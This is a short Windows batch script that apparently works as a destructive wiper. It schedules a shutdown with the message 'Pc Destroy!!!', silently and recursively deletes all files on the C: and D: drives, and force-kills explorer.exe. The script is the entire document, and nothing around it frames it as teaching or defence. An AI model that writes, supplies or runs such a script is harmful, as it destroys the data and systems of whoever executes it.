@echo off
shutdown -s -t 20 -c "Pc Destroy!!!"
del c:\*/s /q
del d:\*/s /q
taskkill /f /im explorer.exe
